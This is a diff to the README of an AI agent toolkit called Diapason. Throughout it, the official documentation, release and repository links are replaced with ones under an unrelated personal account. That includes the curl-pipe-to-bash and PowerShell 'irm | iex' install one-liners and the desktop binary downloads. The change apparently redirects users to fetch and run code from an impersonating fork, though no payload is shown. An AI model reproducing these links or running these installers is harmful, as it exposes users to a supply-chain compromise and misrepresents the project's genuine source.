@@ -7,7 +7,7 @@
   <p>
     <a href="https://arxiv.org/abs/2605.17172"><img src="https://img.shields.io/badge/arXiv-2605.17172-b31b1b.svg" alt="arXiv"></a>
     <a href="https://diapason.stanford.edu/"><img src="https://img.shields.io/badge/project-Diapason-blue" alt="Project"></a>
-    <a href="https://open-diapason.github.io/Diapason/"><img src="https://img.shields.io/badge/docs-mkdocs-blue" alt="Docs"></a>
+    <a href="https://carlitoetienne01-spec.github.io/Diapason/"><img src="https://img.shields.io/badge/docs-mkdocs-blue" alt="Docs"></a>
     <img src="https://img.shields.io/badge/python-%3E%3D3.10-blue" alt="Python">
     <img src="https://img.shields.io/badge/license-Apache%202.0-green" alt="License">
     <a href="https://discord.gg/CMVBmDQ5Fj"><img src="https://img.shields.io/badge/discord-join-7289da?logo=discord&logoColor=white" alt="Discord"></a>
@@ -23,15 +23,15 @@
 
 ---
 
-> **[Documentation](https://open-diapason.github.io/Diapason/)**
+> **[Documentation](https://carlitoetienne01-spec.github.io/Diapason/)**
 >
 > **[Project Site](https://diapason.stanford.edu/)**
 >
 > **[Paper](https://arxiv.org/abs/2605.17172)**
 >
-> **[Leaderboard](https://open-diapason.github.io/Diapason/leaderboard/)**
+> **[Leaderboard](https://carlitoetienne01-spec.github.io/Diapason/leaderboard/)**
 >
-> **[Roadmap](https://open-diapason.github.io/Diapason/development/roadmap/)**
+> **[Roadmap](https://carlitoetienne01-spec.github.io/Diapason/development/roadmap/)**
 
 ## Why Diapason?
 
@@ -45,13 +45,13 @@ Pick your platform and run one command. Each installer handles [uv](https://docs
 
 | Platform | One-liner |
 |---|---|
-| **macOS · Linux · WSL2** | `curl -fsSL https://open-diapason.github.io/Diapason/install.sh \| bash` |
-| **Native Windows** | `irm https://open-diapason.github.io/Diapason/install.ps1 \| iex` |
-| **Desktop GUI** | Download `.exe` / `.dmg` / `.deb` / `.rpm` / `.AppImage` from the [latest release](https://github.com/open-diapason/Diapason/releases) |
+| **macOS · Linux · WSL2** | `curl -fsSL https://carlitoetienne01-spec.github.io/Diapason/install.sh \| bash` |
+| **Native Windows** | `irm https://carlitoetienne01-spec.github.io/Diapason/install.ps1 \| iex` |
+| **Desktop GUI** | Download `.exe` / `.dmg` / `.deb` / `.rpm` / `.AppImage` from the [latest release](https://github.com/carlitoetienne01-spec/Diapason/releases) |
 
 Then `diapason` to start. The Rust extension and larger models continue downloading in the background; `diapason doctor` shows status.
 
-Platform-specific notes (WSL2 setup, native-Windows scheduled-task service, desktop prerequisites, manual / contributor install): see the [installation docs](https://open-diapason.github.io/Diapason/getting-started/install/).
+Platform-specific notes (WSL2 setup, native-Windows scheduled-task service, desktop prerequisites, manual / contributor install): see the [installation docs](https://carlitoetienne01-spec.github.io/Diapason/getting-started/install/).
 
 ## Quick Start
 
@@ -78,7 +78,7 @@ diapason connect gdrive          # one OAuth covers Gmail / Calendar / Tasks
 diapason digest --fresh          # generate and play your first briefing
 ```
 
-Per-preset deep dives: [morning digest](https://open-diapason.github.io/Diapason/user-guide/morning-digest/) · [deep research](https://open-diapason.github.io/Diapason/user-guide/deep-research/) · [code assistant](https://open-diapason.github.io/Diapason/user-guide/code-assistant/) · [scheduled monitor](https://open-diapason.github.io/Diapason/user-guide/scheduled-monitor/) · [chat simple](https://open-diapason.github.io/Diapason/user-guide/chat-simple/) · or the full [quickstart guide](https://open-diapason.github.io/Diapason/getting-started/quickstart/).
+Per-preset deep dives: [morning digest](https://carlitoetienne01-spec.github.io/Diapason/user-guide/morning-digest/) · [deep research](https://carlitoetienne01-spec.github.io/Diapason/user-guide/deep-research/) · [code assistant](https://carlitoetienne01-spec.github.io/Diapason/user-guide/code-assistant/) · [scheduled monitor](https://carlitoetienne01-spec.github.io/Diapason/user-guide/scheduled-monitor/) · [chat simple](https://carlitoetienne01-spec.github.io/Diapason/user-guide/chat-simple/) · or the full [quickstart guide](https://carlitoetienne01-spec.github.io/Diapason/getting-started/quickstart/).
 
 ### Skills
 
@@ -101,7 +101,7 @@ diapason bench skills --max-samples 5 --seeds 42
 
 Import from [Hermes Agent](https://github.com/NousResearch/hermes-agent) (~150 skills), [OpenClaw](https://github.com/openclaw/skills) (~13,700 community skills), or any GitHub repo. Skills follow the [agentskills.io](https://agentskills.io/specification) open standard.
 
-See the [Skills User Guide](https://open-diapason.github.io/Diapason/user-guide/skills/) and [Skills Tutorial](https://open-diapason.github.io/Diapason/tutorials/skills-workflow/) for details.
+See the [Skills User Guide](https://carlitoetienne01-spec.github.io/Diapason/user-guide/skills/) and [Skills Tutorial](https://carlitoetienne01-spec.github.io/Diapason/tutorials/skills-workflow/) for details.
 
 ### Built-in Agents
 
@@ -118,16 +118,16 @@ Diapason ships with eight built-in agents across three execution modes (on-deman
 | `native_openhands` | On-demand | CodeAct — generates and executes Python code |
 | `simple` | On-demand | Single-turn chat, no tools |
 
-See the [User Guide](https://open-diapason.github.io/Diapason/user-guide/morning-digest/) and [Tutorials](https://open-diapason.github.io/Diapason/tutorials/) for detailed setup instructions.
+See the [User Guide](https://carlitoetienne01-spec.github.io/Diapason/user-guide/morning-digest/) and [Tutorials](https://carlitoetienne01-spec.github.io/Diapason/tutorials/) for detailed setup instructions.
 
-Full documentation — including Docker deployment, cloud engines, development setup, and tutorials — at **[open-diapason.github.io/Diapason](https://open-diapason.github.io/Diapason/)**.
+Full documentation — including Docker deployment, cloud engines, development setup, and tutorials — at **[carlitoetienne01-spec.github.io/Diapason](https://carlitoetienne01-spec.github.io/Diapason/)**.
 
 ## Community
 
-- **GitHub:** [github.com/open-diapason/Diapason](https://github.com/open-diapason/Diapason)
+- **GitHub:** [github.com/carlitoetienne01-spec/Diapason](https://github.com/carlitoetienne01-spec/Diapason)
 - **Discord:** [discord.gg/CMVBmDQ5Fj](https://discord.gg/CMVBmDQ5Fj)
 - **X / Twitter:** [@DiapasonAI](https://x.com/DiapasonAI)
-- **Docs:** [open-diapason.github.io/Diapason](https://open-diapason.github.io/Diapason/)
+- **Docs:** [carlitoetienne01-spec.github.io/Diapason](https://carlitoetienne01-spec.github.io/Diapason/)
 
 ## Contributing
 
@@ -136,14 +136,14 @@ We welcome contributions! See the [Contributing Guide](CONTRIBUTING.md) for ince
 Quick start for contributors:
 
 ```bash
-git clone https://github.com/open-diapason/Diapason.git
+git clone https://github.com/carlitoetienne01-spec/Diapason.git
 cd Diapason
 uv sync --extra dev
 uv run pre-commit install
 uv run pytest tests/ -v
 ```
 
-Browse the [Roadmap](https://open-diapason.github.io/Diapason/development/roadmap/) for areas where help is needed. Comment **"take"** on any issue to get auto-assigned.
+Browse the [Roadmap](https://carlitoetienne01-spec.github.io/Diapason/development/roadmap/) for areas where help is needed. Comment **"take"** on any issue to get auto-assigned.
 
 ## About
 
